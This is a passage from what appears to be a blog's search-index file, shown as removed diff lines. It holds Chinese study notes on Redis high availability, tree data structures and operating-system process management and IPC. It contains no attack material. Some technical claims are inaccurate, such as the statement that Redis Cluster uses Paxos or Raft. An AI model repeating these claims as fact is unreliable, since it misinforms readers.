-使用 Redis Cluster（集群）Redis 集群是一种分布式部署方式，能够通过分片将数据分布到多个节点上，每个主节点都有一个或多个从节点进行备份。在 Redis 集群中：
-
-主从备份：每个主节点都有一个或多个从节点作为备份，确保主节点故障时可以进行快速的故障转移。
-自动选举：集群内部会自动进行主节点的选举，避免了因为某个节点不可用而导致的数据不一致。
-PAXOS 或 Raft 协议：集群内部使用一致性协议来确保数据的一致性，避免脑裂问题。
-
-使用 Redis 集群可以通过分布式架构减少单点故障的影响，自动化的故障转移机制有效降低了脑裂发生的几率。
-合理设计客户端架构为了避免在 Redis 主从架构中发生脑裂问题，客户端架构需要能够动态适应主从节点的变化。现代 Redis 客户端（如 redis-py）通常支持与 Redis Sentinel 或 Redis Cluster 协作，能够自动获取当前的主节点信息，并在发生故障时自动切换连接。
-客户端应具备以下功能：
-
-自动发现主节点：客户端能够自动从 Sentinel 或集群获取主节点信息，确保在节点变化时无缝切换。
-支持故障转移：客户端支持 Sentinel 的故障转移机制，能够在主节点不可用时自动连接到新的主节点。
-
-通过设计智能客户端，可以减少由于节点故障带来的脑裂问题。
-监控和报警系统除了配置 Redis Sentinel 和 Redis 集群外，建立全面的监控和报警系统同样重要。通过监控 Redis 实例的健康状态，可以在节点出现异常时及时发现问题，避免脑裂的发生。
-常见的监控项包括：
-
-节点的连接状态和响应时间
-主从同步的延迟
-Redis 实例的内存和 CPU 使用情况
-
-结合报警系统，确保在发生故障时能够迅速采取措施进行修复，防止脑裂的发生。
-总结通过使用 Redis Sentinel 或 Redis 集群，并合理配置主从同步策略，可以有效避免 Redis 主从架构中的脑裂问题。此外，设计智能客户端架构和建立完善的监控报警机制，也能进一步提升系统的容错能力，确保 Redis 在高可用性和一致性方面的稳定运行。
-Redis Sentinel 和 ZooKeeper 的区别设计目标和功能Redis Sentinel： Redis Sentinel 是专为 Redis 提供高可用性解决方案的工具。它主要负责监控 Redis 实例，检测主节点的状态，并在主节点故障时执行自动故障转移，将从节点提升为新的主节点。它的核心功能包括故障检测、故障转移、通知和监控。Redis Sentinel 适用于 Redis 集群的高可用性管理。
-ZooKeeper： ZooKeeper 是一个分布式协调服务，旨在帮助不同的分布式应用系统管理配置、命名、同步服务等。它不仅限于 Redis，广泛用于需要高一致性和协调的分布式系统中。ZooKeeper 提供了分布式锁、配置管理、节点监控、领导者选举等多种功能，适用于大规模的分布式应用。ZooKeeper 提供的强一致性协议使得它适用于任何需要分布式协调的应用。
-总结Redis Sentinel 和 ZooKeeper 都是高可用性和分布式系统中的重要工具，但它们的应用场景、设计目标和功能有所不同。Redis Sentinel 专为 Redis 提供高可用性解决方案，适用于 Redis 集群的监控和故障转移。而 ZooKeeper 是一个通用的分布式协调服务，适用于广泛的分布式系统，提供强一致性和协调功能，支持更复杂的分布式应用。
-]]></content>
-      <tags>
-        <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据结构</title>
-    <url>/2025/04/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[快速回忆下大学的数据结构课， 这些看完， 大概下面这些能理解一点啦~
-
-树
-二叉查找树
-完全二叉树
-平衡二叉树
-n叉树
-树的遍历
-B+树
-跳表
-红黑树
-AVL树
-B树
-
-树的基本概念学习树的基础是理解更复杂的树结构（如红黑树、AVL树等）的前提。让我们从最基本的树概念开始。
-树（Tree）是一种非线性的数据结构，由节点（Node）组成，节点之间通过边（Edge）连接。树的结构很像倒立的家谱图或者文件系统的结构。
-树是由根节点（Root）开始，经过多个层级的分支（Branch），直到叶子节点（Leaf）
-树的基本术语：
-根节点（Root）：树的起始节点，没有父节点。
-节点（Node）：树中的每个元素，包含数据部分以及指向其他节点的指针（或引用）。
-边（Edge）：节点之间的连接。
-子节点（Child）：直接连接到某个节点的节点，称为该节点的子节点。
-父节点（Parent）：一个节点的直接连接节点是它的父节点。
-叶子节点（Leaf）：没有子节点的节点。
-高度（Height）：树的高度是从根节点到最深的叶子节点的最长路径的长度（也可以理解为树的层级数）。
-深度（Depth）：节点的深度是从根节点到该节点的路径长度。
-层级（Level）：树中的每一层，通常层级从0开始（根节点是第0层）。
-
-树的类型树可以有不同的形式，以下是几种常见的树类型：
-二叉树 (Binary Tree)
-定义：每个节点最多有两个子节点，通常称为左子节点和右子节点。
-特点：
-每个节点最多有两个子节点。
-二叉树的每个节点可以有不同数量的子节点（0个、1个或2个）。
-
-
-用途：二叉树是很多复杂树结构的基础，例如二叉查找树、堆等。
-
-二叉查找树 (Binary Search Tree, BST)
-定义：它是一种特殊的二叉树，节点的左子树上的所有值都小于节点的值，右子树上的所有值都大于节点的值。
-特点：
-左子树的所有节点的值都小于根节点。
-右子树的所有节点的值都大于根节点。
-这使得搜索操作可以通过比较快速地确定走向左子树还是右子树。
-
-
-用途：用于实现高效的查找、插入、删除等操作。
-
-完全二叉树 (Complete Binary Tree)
-定义：一个二叉树，除了最后一层外，其他层都是满的，并且最后一层的节点都靠左排列。
-特点：
-除了最后一层，其他层的节点数量都是满的。
-最后一层的节点从左到右填充。
-
-
-用途：常用于堆（如大顶堆和小顶堆）等数据结构。
-
-平衡二叉树 (Balanced Binary Tree)
-定义：平衡二叉树是一种二叉树，要求每个节点的左右子树高度差不超过一定的范围（如 AVL 树就是一种平衡二叉树）。
-特点：
-保证树的高度较低，避免树退化成链表。
-高效的查找、插入和删除操作。
-
-
-用途：如 AVL 树、红黑树等，广泛用于数据库索引。
-
-n叉树 (n-ary Tree)
-定义：n叉树是每个节点最多有n个子节点的树。
-特点：
-每个节点最多有n个子节点。
-常用于表示具有多层次的复杂数据结构，如文件系统。
-
-
-
-树的遍历树的遍历是指访问树中所有节点的过程。常见的树的遍历方式有三种：
-前序遍历 (Preorder Traversal)
-步骤：先访问当前节点，然后递归地前序遍历左子树，再递归地前序遍历右子树。
-顺序：根节点 → 左子树 → 右子树。
-
-中序遍历 (Inorder Traversal)
-步骤：递归地中序遍历左子树，访问当前节点，然后递归地中序遍历右子树。
-顺序：左子树 → 根节点 → 右子树。
-特点：二叉查找树的中序遍历结果是按从小到大的顺序排列的。
-
-后序遍历 (Postorder Traversal)
-步骤：递归地后序遍历左子树，再递归地后序遍历右子树，然后访问当前节点。
-顺序：左子树 → 右子树 → 根节点。
-
-层次遍历 (Level Order Traversal)
-步骤：按层级遍历树的节点，通常使用队列来实现。
-顺序：根节点 → 第一层 → 第二层 → 第三层 → ……直到最后一层。
-
-树的应用树作为一种数据结构，有许多实际应用，常见的包括：
-
-文件系统：文件和目录组织成树形结构，根目录是树的根节点，文件和文件夹是节点。
-数据库索引：树结构（如B树、B+树）常用于数据库的索引，帮助快速查找数据。
-游戏决策树：用于表示游戏中的可能决策路径。
-
-
-二叉查找树（Binary Search Tree, BST）定义二叉查找树是一种特殊的二叉树，满足以下性质：
-
-每个节点最多有两个子节点。
-左子树中所有节点的值小于根节点。
-右子树中所有节点的值大于根节点。
-每一棵子树也都是一棵二叉查找树。
-
-操作查找（Search）
-从根节点开始：
-
-如果目标值等于当前节点，返回。
-如果目标值小于当前节点，进入左子树。
-如果目标值大于当前节点，进入右子树。
-
-查找的时间复杂度与树的高度有关，最坏是 O(n)，最优是 O(log n)。
-插入（Insert）
-插入值时，按查找路径向下走，找到空位插入即可，不会破坏 BST 结构。
-删除（Delete）
-分三种情况处理：
-
-删除叶子节点，直接删除。
-删除只有一个子节点的节点，用子节点替换该节点。
-删除有两个子节点的节点，找到该节点的中序后继或中序前驱，用它的值替换当前节点，再删除那个节点。
-
-问题：BST 可能退化成链表如果连续插入有序数据，例如 1、2、3、4、5，树就会变成单边链表，导致查找效率退化为 O(n)。
-为了解决这个问题，就需要引入“自平衡”的机制，也就是平衡二叉树。
-
-平衡二叉树的基本思想什么是平衡树的高度决定了查找、插入、删除的效率。所谓平衡，是指尽量保持每个节点的左右子树高度差不要太大，避免形成单边长链。
-平衡树的目标是让树的高度保持在 O(log n) 以内，从而提高整体性能。
-平衡的实现手段：旋转操作当插入或删除节点后导致失衡，可以通过旋转操作让树重新平衡。
-左旋
-将某个节点的右子节点提升为新的父节点，原父节点变为其左子节点。
-例子： 节点 A 有右子节点 B，B 再有右子节点 C
-原始结构：    A     \      B       \        C左旋后：    B   / \  A   C
-
-右旋
-将某个节点的左子节点提升为新的父节点，原父节点变为其右子节点。
-例子： 节点 C 有左子节点 B，B 再有左子节点 A
-原始结构：    C   /  B /A右旋后：    B   / \  A   C
-
-通过这些旋转，可以动态调整树结构，使其保持平衡。
-
-红黑树简介红黑树是自平衡的二叉查找树，它使用颜色和旋转来控制树的高度。
-红黑树不是严格平衡的，但它能保证最长路径不会超过最短路径的两倍，因此效率稳定。
-红黑树的五个性质
-每个节点是红色或黑色。
-根节点必须是黑色。
-所有叶子节点（NIL 节点）是黑色。
-如果一个节点是红色的，则它的两个子节点必须是黑色的（不能连续两个红色节点）。
-从任意节点到其所有叶子节点的路径上，包含的黑色节点数量必须相同。
-
-这些性质共同保证了树的平衡性。
-
-总结
-普通二叉查找树查找效率依赖于树高，可能退化成链表。
-平衡二叉树通过旋转操作保持结构平衡，提升查找、插入、删除性能。
-红黑树是一种宽松的平衡树，通过颜色约束加旋转来维持近似平衡。
-红黑树是很多底层库和系统（如 Java TreeMap、C++ STL、Linux 内核）使用的高效结构。
-
-
-红黑树与 AVL 性能对比，如何选型这是一个很实用、也很容易被误解的问题。我们来进行一次实事求是的对比，站在工程实践的角度，讲清楚 红黑树 vs AVL 树 的性能差异、适用场景、优缺点、如何选型。
-
-红黑树与 AVL 树的核心差异
-
-
-比较点
-AVL 树
-红黑树
-
-
-
-平衡性
-严格平衡（左右子树高度差 ≤ 1）
-相对平衡（通过颜色规则控制）
-
-
-插入效率
-较慢，可能频繁旋转
-较快，旋转次数更少
-
-
-删除效率
-更慢（容易失衡）
-更快（更容忍不平衡）
-
-
-查找效率
-稍快（更矮更“紧凑”）
-稍慢（更高一些）
-
-
-实现复杂度
-中等
-略高，染色逻辑更麻烦
-
-
-实际树高
-log(n)，更低
-最坏 2log(n)，略高但可接受
-
-
-应用场景
-查找密集
-插入&#x2F;删除频繁
-
-
-
-时间复杂度对比（理论上相同）
-
-
-操作
-AVL
-红黑树
-
-
-
-查找
-O(log n)
-O(log n)
-
-
-插入
-O(log n) + 最多 2 次旋转
-O(log n) + 最多 3 次旋转 + 染色
-
-
-删除
-O(log n) + 最多 log n 次旋转
-O(log n) + 最多 3 次旋转 + 染色
-
-
-注意：红黑树旋转次数少于 AVL，是因为它更“宽松”地控制平衡。
-
-为什么工程中更常用红黑树？1. 插入、删除性能更稳定AVL 树插入删除操作中需要频繁调整结构（旋转），因为它追求高度的平衡性。虽然这保证了查找很快，但维护成本高。
-红黑树采用更“保守”的平衡策略，调整动作较少，整体吞吐量更好。这在系统级开发中非常重要，比如操作系统、数据库、语言运行时。
-2. 插入&#x2F;删除频率高时，红黑树吞吐量优于 AVLAVL树适合“读多写少”的场景，比如缓存系统。
-红黑树适合“读写都频繁”的场景，比如内核调度、任务队列、映射表等。
-
-实际案例对比Java TreeMap &#x2F; TreeSet
-使用的是 红黑树 实现
-原因：Java中集合类通常面对频繁插入和删除（如实时排序、排名等），红黑树性能更均衡
-
-C++ STL 的 std::map &#x2F; std::set
-也使用的是 红黑树
-同样考虑的是泛型容器的插入&#x2F;删除复杂度
-
-Linux 内核调度器 &#x2F; 时间红黑树（RB-tree）
-使用的是红黑树（见 include/linux/rbtree.h）
-因为调度器中的进程插入&#x2F;删除频繁，而查找不一定多，所以使用红黑树性能更佳
-
-
-什么时候选 AVL 树？虽然工程里红黑树更常见，但 AVL 并不是没用，它在以下场景下依然有价值：
-
-对查找性能要求极致，数据变动频率低的场景
-如内存索引、缓存服务、读密集型数据库
-
-
-数据量适中，性能压力可控，希望保证查找时间始终最优
-
-比如：一个静态配置中心，你预先插入一些配置项，然后主要是查找访问。用 AVL 是合理的。
-
-工程选型建议总结
-
-
-场景
-推荐结构
-原因
-
-
-
-查找频繁、插入删除极少
-AVL
-查找快，保持严格平衡
-
-
-插入&#x2F;删除频繁，查找适中
-红黑树
-性能更均衡，旋转少
-
-
-需要范围查询
-B+树
-存储系统常用结构（如数据库）
-
-
-高并发环境下
-并发跳表 &#x2F; 哈希表
-红黑树&#x2F;AVL 不擅长并发控制
-
-
-内核、调度系统
-红黑树
-插入&#x2F;删除频繁，吞吐量更重要
-
-
-学术 &#x2F; 教学用
-AVL
-更容易推导、理解平衡原理
-
-
-
-总结一句话红黑树是工业界的主流选型，因为它在保持平衡和性能之间做了非常合理的权衡。
-而 AVL 更适合做“查找效率最优”的算法研究、教学或低变更场景。
-B树、B+树、跳表非常好，接下来我们进入数据库&#x2F;存储系统中常用的三种结构：B树、B+树、跳表，它们都是用于范围查找、批量排序、动态插入删除等复杂需求下的数据结构。
-我会按这个顺序讲解：
-
-先讲 B 树：基础结构，理解它是后续 B+ 树的前提
-再讲 B+ 树：数据库索引、文件系统最常用结构
-最后讲跳表：高性能内存结构，Redis 的最爱
-
-每一个我们都会涵盖：
-
-是什么（直观理解）
-如何组织数据
-查找&#x2F;插入&#x2F;删除怎么做
-为什么它适合某类场景
-
-
-B 树（Balanced Tree &#x2F; 多路平衡查找树）是什么B 树是一种多路搜索树，是对二叉搜索树的推广。每个节点不仅可以有两个子节点，而是可以有多个。广泛用于磁盘存储、数据库索引结构中，因为它减少了磁盘读写次数。
-特点
-每个节点最多有 m-1 个数据项，m 个子指针（m 是阶数）
-所有节点的关键字保持有序
-插入、删除后依然保持平衡
-所有叶子节点在同一层（树高固定）
-
-举例（以3阶 B 树为例）
-一个节点最多 2 个键，最多有 3 个子节点
-比如节点中有 [10, 20]，它的子树范围：
-子树1：小于 10
-子树2：10~20
-子树3：大于 20
-
-
-
-查找和二分查找类似：
-
-从根节点开始，在节点中查找关键字位置（可以使用二分）
-找不到则沿对应子树向下
-
-时间复杂度为 O(log n)，但每一层“跨度大”，所以树的高度更低，查找更快
-插入
-找到插入位置，插入键
-如果节点已满，就分裂节点，中间值“上提”到父节点
-插入可能从叶子一路调整到根节点，最多增加一层高度
-
-删除
-类似 BST，找到值删掉
-如果节点删除后不满足最小关键字数量，就需要向兄弟借值或合并节点
-复杂度 O(log n)
-
-应用场景
-MySQL 的 MyISAM 引擎使用的是 B 树索引
-适合中等范围查询、单点查找、插入删除都频繁的磁盘结构
-
-
-B+ 树（B Tree 的增强版）是什么B+ 树是 B 树的一个变种，所有值都存在叶子节点，非叶子节点只做“导航”。
-MySQL InnoDB、文件系统、LevelDB 等都使用 B+ 树作为索引结构。
-和 B 树的区别
-
-
-特性
-B 树
-B+ 树
-
-
-
-数据存储
-所有节点存数据
-只有叶子节点存数据
-
-
-内部节点
-数据 + 导航
-仅导航（索引）
-
-
-查找路径
-可提前终止
-一定走到叶子节点
-
-
-范围查询
-差
-强（叶子节点有链表）
-
-
-特点
-所有叶子节点通过链表串起来，方便范围查询
-非叶子节点只做索引，节省空间，扇出更高，树更矮
-结构更适合磁盘块对齐，减少 IO 次数
-
-查找
-和 B 树类似，但一定查到叶子节点才能拿到数据
-路径更统一，便于实现
-
-范围查询
-特别高效，只需要找到范围起点，然后从链表顺着读下去即可
-
-应用场景
-数据库索引（MySQL InnoDB）
-文件系统（如 NTFS, XFS）
-批量范围读取、数据分页、高并发写场景
-
-
-跳表（Skip List）是什么跳表是一种通过在链表上建立多级索引的方式实现快速查找的数据结构。
-你可以理解为：链表 + 多层快速通道，是“概率化”实现的平衡树。
-结构
-底层是有序链表（维护所有元素）
-每一层随机选取一些节点参与“快速通道”
-每一层都是下一层的子集，最顶层最稀疏
-
-比如有 16 个节点，可能层结构像这样：
-Level 3:      A --------- HLevel 2:      A ---- E -- H -- MLevel 1: A - B - C - D - E - F - G - H - I - ... - P
-
-查找
-从顶层开始，逐层往下，直到定位到目标位置
-每次跳跃跨度大，大大加快查找速度
-
-平均时间复杂度：O(log n)
-插入 &#x2F; 删除
-插入新节点后，按概率决定它会出现在多少层（比如 Redis 是1&#x2F;4 概率上升一层）
-删除也是先找到节点，再清理所有层级中的引用
-
-时间复杂度：O(log n)
-应用场景
-Redis 的 zset（有序集合）使用跳表实现
-比树更容易实现，适合内存结构、并发场景
-查找、插入、删除都非常高效
-不需要复杂的旋转、维护，代码比平衡树更简单
-
-
-三者对比总结
-
-
-特性
-B 树
-B+ 树
-跳表
-
-
-
-查找效率
-O(log n)
-O(log n)
-O(log n)
-
-
-插入&#x2F;删除
-O(log n)
-O(log n)
-O(log n)（更简单）
-
-
-是否适合磁盘
-是
-是（最佳）
-否，适合内存
-
-
-是否适合范围查询
-一般
-强（链表）
-强（链表）
-
-
-实现复杂度
-中
-中高
-低（逻辑简单）
-
-
-工程应用
-MyISAM索引
-InnoDB索引，文件系统
-Redis zset、有序内存结构
-
-
-
-总结建议
-数据库磁盘索引：使用 B+ 树。查找、范围查询快，IO次数少，MySQL&#x2F;Oracle&#x2F;SQLite都用它。
-键值对内存结构（Redis）：用跳表。简单好用，查找&#x2F;插入性能稳定。
-老的存储结构或小范围索引：B 树也能用，但现在基本被 B+ 树取代。
-
-
-B树和B+树对比
-B树 和 B+树 都是自平衡的多路查找树，它们通过分支节点和数据节点组织数据，确保了对大规模数据的高效查找。
-B+树 相比于 B树，更加高效，特别是在 范围查询 和 顺序访问 上，因此在数据库和文件系统中，B+树的应用更加广泛。
-B树 适合需要 较少的范围查询 或 较均衡的查找操作 的场景，而 B+树 更适合 大规模数据存储、范围查询和顺序扫描 的场景。
-
-
-什么是 AVL 树？AVL 树 是一种 自平衡的二叉查找树（Binary Search Tree, BST），它的全称是：
-Adelson-Velsky and Landis Tree由两位苏联科学家在 1962 年提出，是世界上第一个自平衡二叉查找树。
-
-AVL 树的核心特性自平衡的定义对于 树中的每一个节点，都必须满足：
-左子树和右子树的高度差 ≤ 1
-这个高度差我们称为该节点的 平衡因子（Balance Factor），它的取值只能是：
-
--1（右子树比左子树高一层）
-0（左右等高）
-+1（左子树比右子树高一层）
-
-一旦插入或删除节点后某个节点的平衡因子超过这个范围（比如变成了 2 或 -2），就需要通过旋转操作来恢复平衡。
-
-为什么需要 AVL 树？普通的二叉查找树（BST）在最坏情况下会退化成链表，导致操作效率变为 O(n)。而 AVL 树通过强制控制“平衡因子”，保持树高度为 O(log n)，确保：
-
-查找（Search）
-插入（Insert）
-删除（Delete）
-
-这些操作都能在对数时间内完成。
-
-AVL 树的旋转操作单旋（Single Rotation）
-右旋（Right Rotation）用于左子树过高（LL 失衡）
-左旋（Left Rotation）用于右子树过高（RR 失衡）
-
-双旋（Double Rotation）
-先左旋再右旋（Left-Right Rotation）用于插入到左子树的右子树（LR 型失衡）
-先右旋再左旋（Right-Left Rotation）用于插入到右子树的左子树（RL 型失衡）
-
-
-操作复杂度
-
-
-操作
-时间复杂度
-
-
-
-查找
-O(log n)
-
-
-插入
-O(log n)（可能旋转）
-
-
-删除
-O(log n)（可能多次旋转）
-
-
-AVL 树高度非常低，接近 log₂(n)，因此查找性能极优。
-
-示例假设我们依次插入以下节点：10 → 20 → 30
-普通 BST 结构变成：
-10  \   20     \      30
-
-此时树高度为 3，已经失衡，AVL 会做一次左旋，变成：
-20   /  \  10  30
-
-保持了平衡。
-
-AVL 树 vs 红黑树
-
-
-对比项
-AVL 树
-红黑树
-
-
-
-平衡程度
-更严格（左右子树高差 ≤ 1）
-较宽松（限制黑节点数目）
-
-
-插入&#x2F;删除效率
-较慢，旋转多
-较快，旋转少
-
-
-查找效率
-稍快
-稍慢
-
-
-实际应用
-内存查找、读多写少
-系统结构、写操作多
-
-
-实现复杂度
-中
-高
-
-
-
-适用场景
-查找频率高，插入&#x2F;删除少的场景，如内存中的索引结构
-不适合频繁更新的场景，因为每次插入&#x2F;删除都可能触发旋转
-
-
-B树与平衡二叉查找树的对比
-
-
-特性
-B树
-平衡二叉查找树（如 AVL 树、红黑树）
-
-
-
-适用场景
-大规模数据存储，尤其是磁盘存储；数据库索引，文件系统管理
-内存中的动态数据存储，集合、映射、优先队列等
-
-
-树的结构
-多路树，每个节点有多个子节点
-二叉树，每个节点最多有两个子节点
-
-
-查找性能
-O(log n)，但通常更适合磁盘存储，减少磁盘访问次数
-O(log n)，在内存中查找非常高效
-
-
-节点大小
-每个节点包含多个键和多个子指针，适合减少磁盘访问次数
-每个节点只包含一个键和最多两个子指针
-
-
-插入&#x2F;删除操作
-节点分裂&#x2F;合并，通常需要更复杂的操作来保持平衡
-旋转操作，通过保持平衡因子来保证平衡
-
-
-支持范围查询
-非常高效，能够快速查找和遍历范围数据
-支持范围查询，但对于大量范围查询不如 B 树高效
-
-
-内存与存储
-适合外存存储，能高效处理大量数据
-适用于内存数据管理，数据规模适中，内存存储
-
-
-]]></content>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>操作系统</title>
-    <url>/2025/04/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
-    <content><![CDATA[操作系统的基本概念什么是操作系统操作系统（Operating System，简称 OS）是管理计算机硬件和软件资源的系统程序，是用户与硬件之间的中介。它负责管理 CPU、内存、磁盘、外设等资源，调度任务的执行，并为应用程序提供统一的接口。
-常见的操作系统包括 Linux、Windows、macOS、Android、iOS 等。不同的操作系统在用户体验、系统结构和调度策略上各有差异，但其核心机制大体相似。
-
-操作系统的主要功能进程管理进程是正在运行的程序实例。操作系统负责创建、调度、终止进程，并提供进程间通信（IPC）机制。多进程系统可以并发运行多个任务，提高资源利用率。
-内存管理操作系统需要管理所有程序的内存空间，避免冲突，并提供抽象的虚拟地址空间，使得每个程序看似拥有完整的内存。分页、分段、交换空间（Swap）等技术常用于内存管理。
-文件系统文件系统是组织和存储数据的结构方式。它定义了文件的命名、权限、目录结构、读写方式等。常见的文件系统包括 FAT32、NTFS、ext4 等。
-设备管理所有硬件设备如硬盘、网络卡、显示器等都通过驱动程序与操作系统交互。操作系统负责管理这些设备的访问权限、调度和数据传输。
-用户接口操作系统提供命令行界面（CLI）或图形用户界面（GUI），作为用户与系统交互的桥梁。例如 bash、cmd、GNOME 等。
-
-进程管理什么是进程进程（Process）是操作系统资源分配的基本单位，是程序在运行时的一个实例。一个程序可以对应多个进程，比如打开多个浏览器窗口，每一个窗口就是一个进程。
-操作系统通过进程来实现多任务运行，每个进程都有自己的地址空间、代码、数据和运行状态。
-
-进程与程序的区别程序是静态的代码文件，是指令和数据的集合，而进程是程序执行时的动态实体。程序可以看作是进程的模板。
-简单说，程序是“静止”的，进程是“活着”的。
-
-进程的状态一个进程在生命周期中通常会经历以下几种状态：
-
-就绪（Ready）：进程已准备好运行，等待 CPU 分配时间片。
-运行（Running）：进程正在使用 CPU 运行指令。
-阻塞（Blocked）：进程等待某个事件（如 I&#x2F;O 完成）而暂停运行。
-终止（Terminated）：进程运行结束，资源被回收。
-新建（New）：刚创建，还未就绪。
-挂起（Suspended）：被系统暂停，可能因资源限制或人工干预。
-
-
-上下文切换（Context Switch）多进程系统中，操作系统需要在不同进程之间切换 CPU 使用权。为了让切换透明且安全，系统会在切换前保存当前进程的状态（寄存器、程序计数器、堆栈指针等），切换后再恢复另一个进程的状态。
-这种切换过程称为上下文切换。虽然切换频繁带来了并发体验，但频繁上下文切换会引起性能损耗。
-
-线程与进程的关系线程（Thread）是比进程更小的执行单元。多个线程可以共享同一个进程的资源（如内存），但它们有自己的栈和寄存器。
-
-进程是资源分配的单位，线程是 CPU 调度的单位。
-线程切换的开销比进程小，因此多线程常用于高性能并发编程。
-
-
-多进程与多线程的对比
-
-
-特性
-多进程
-多线程
-
-
-
-内存空间
-每个进程独立
-同一进程的线程共享空间
-
-
-创建开销
-较大
-较小
-
-
-通信方式
-使用进程间通信（IPC）
-直接共享内存，需同步控制
-
-
-稳定性
-一个进程崩溃不会影响其他
-一个线程崩溃可能影响整个进程
-
-
-适用场景
-安全隔离、重任务分工
-轻量级并发、高 IO 效率
-
-
-
-进程调度算法操作系统在多个进程之间分配 CPU 的方式称为调度。不同的调度算法适用于不同场景：
-
-先来先服务（FCFS）：按进程到达顺序排队处理，简单但不公平。
-短作业优先（SJF）：优先处理运行时间短的任务，平均等待时间短，但可能饿死长任务。
-时间片轮转（RR）：给每个进程分配固定时间片，公平性好，适合分时系统。
-优先级调度：按优先级执行高的进程，易导致低优先级进程长时间等待。
-多级反馈队列（MLFQ）：动态调整进程优先级，综合考虑响应时间和公平性，复杂但实用。
-完全公平调度（CFS）：CFS 通过维护一个 红黑树 来管理所有可执行进程。每个进程会根据其 虚拟运行时间（也称为“权重”或“时间片”）被放置在红黑树中，进程的虚拟运行时间越小，越先被调度执行。Linux默认采用该算法。CFS 设计的目标是确保每个进程（或线程）都能公平地共享 CPU 时间，从而实现较为平衡的性能表现，特别是对于多核和多线程的环境
-
-
-进程间通信（IPC）当多个进程需要协作时，就必须进行通信。常见的通信方式包括：
-
-管道（Pipe）：一种半双工通信机制，只能在父子进程之间使用。
-命名管道（FIFO）：增强版的管道，支持不相关进程间通信。
-消息队列：进程以消息为单位进行通信，系统管理消息缓冲区。
-共享内存：最高效的通信方式，多个进程访问同一块物理内存，但需要加锁同步。
-信号量：主要用于同步机制，避免竞争条件。
-套接字（Socket）：支持不同主机之间的进程通信。
-
-
-同步与互斥当多个线程或进程共享资源时，必须保证数据一致性，避免“竞态条件”（Race Condition）。这需要使用同步和互斥机制：
-
-互斥锁（Mutex）：一段代码在同一时刻只能被一个线程访问。
-信号量（Semaphore）：一种计数锁，可以控制访问某资源的线程数。
-自旋锁（Spinlock）：不断尝试获取锁，适合锁持有时间短的场景。
-条件变量：配合锁使用，实现复杂的等待-唤醒机制。
-
-
-进程间通信（IPC）在多进程系统中，不同的进程运行在独立的内存空间中，默认情况下彼此之间无法直接访问对方的数据。然而，实际应用中很多任务都需要多个进程协作完成，这就必须依赖进程间通信机制（IPC）来交换数据、传递信号或同步行为。
-操作系统提供了多种 IPC 方法，不同的方法适用于不同的场景，权衡了效率、复杂度和安全性。
-
-IPC 的典型用途
-数据传输：在进程之间传递数据，例如图像处理中的主进程和工作进程。
-事件通知：某进程完成任务后通知另一个进程，如 GUI 与后台服务的交互。
-资源共享：多个进程共同使用某个资源时，通过同步机制避免冲突。
-进程控制：父进程控制子进程的行为，如终止、暂停、唤醒等。
-
-
-常见的进程间通信方式管道（Pipe）管道是一种最基础的 IPC 方式，只能在有亲缘关系的进程之间使用，如父子进程。
-
-单向传输，数据只能从写端流向读端。
-典型用法：ls | grep &quot;txt&quot;，Shell 会创建两个进程，用管道连接它们的输出和输入。
-
-系统调用：
-int pipe(int fd[2]);
-
-fd[0] 是读端，fd[1] 是写端。
-命名管道（FIFO）命名管道是管道的增强版本，允许无血缘关系的进程通信，通过文件系统中的特殊文件来标识。
-
-数据读写像文件操作一样进行。
-可以跨进程、甚至跨 Shell 通信。
-使用 mkfifo() 或 mknod() 创建。
-
-mkfifo /tmp/myfifo
-
-消息队列（Message Queue）消息队列允许进程以消息为单位异步通信。内核负责缓存消息，进程读取时按消息顺序或优先级读取。
-
-支持多生产者、多消费者模型。
-消息结构化，通信可靠。
-不共享内存，较安全。
-
-系统调用：
-msgget(), msgsnd(), msgrcv(), msgctl()
-
-共享内存（Shared Memory）共享内存将一块物理内存映射到多个进程的地址空间，是效率最高的一种通信方式。
-
-多个进程可以同时读写共享区域，适合高频数据交换。
-通常需要配合信号量或互斥锁来同步访问，避免数据竞争。
-适合大数据量的传输场景，如图像处理、视频编码等。
-
-系统调用：
-shmget(), shmat(), shmdt(), shmctl()
-
-信号量（Semaphore）信号量并不直接传输数据，而是用于实现进程间的同步与互斥控制。
-
-类似交通红绿灯，控制进程对共享资源的访问。
-信号量可与共享内存搭配使用，实现高效且安全的通信。
-
-系统调用：
-semget(), semop(), semctl()
-
-信号（Signal）信号是一种轻量级的通知机制，操作系统通过信号向进程传递事件通知。
-
-类似中断，用于处理如中止、超时、非法访问等事件。
-常见信号有 SIGINT（Ctrl+C）、SIGKILL、SIGTERM 等。
-可自定义信号处理函数，使用 signal() 或 sigaction() 注册。
-
-套接字（Socket）套接字支持不同主机或本机任意进程之间的通信，是构建网络通信的基础。
-
-分为**本地套接字（Unix Domain Socket）和网络套接字（TCP&#x2F;UDP）**。
-本地套接字用于同一台机器内的进程通信，性能高于 TCP 套接字。
-网络套接字支持跨主机通信，是分布式系统通信的核心方式。
-
-系统调用：
-socket(), bind(), listen(), accept(), connect(), send(), recv()
-
-socket有多种不同类型，比如常见的ip:port是网络套接字
-
-
-
-socket 类型
-地址格式
-用途
-
-
-
-AF_INET
-IP:PORT
-IPv4 网络通信
-
-
-AF_INET6
-[IPv6]:PORT
-IPv6 网络通信
-
-
-AF_UNIX &#x2F; AF_LOCAL
-文件路径（如 /tmp/mysock）
-本地进程通信（IPC）
-
-
-AF_PACKET
-网络接口 + 协议
-底层网络抓包（如 Wireshark）
-
-
-AF_BLUETOOTH
-MAC 地址 + 通道
-蓝牙通信
-
-
-AF_NETLINK
-内核通信通道
-Linux 内核与用户空间通信
-
-
-
-实际开发中如何选择 IPC 方式
-对于高频大数据传输：优先使用共享内存 + 同步机制
-对于结构化、可靠消息传递：使用消息队列或本地套接字
-对于跨主机通信：使用网络套接字（如 TCP）
-对于简单通知或事件触发：使用信号或信号量
-父子进程间传输：使用管道或共享内存
-多线程通信：直接共享内存，配合互斥锁或条件变量
-
-
-内存管理内存管理的作用内存管理的目标是高效、安全、合理地分配系统内存资源。现代操作系统通过内存管理机制，让每个进程都以为自己拥有完整的独立内存空间，实际上却在后台进行着复杂的资源调度和地址映射。
-内存管理不仅负责分配和回收内存，还必须处理内存保护、共享、虚拟化等需求。
-
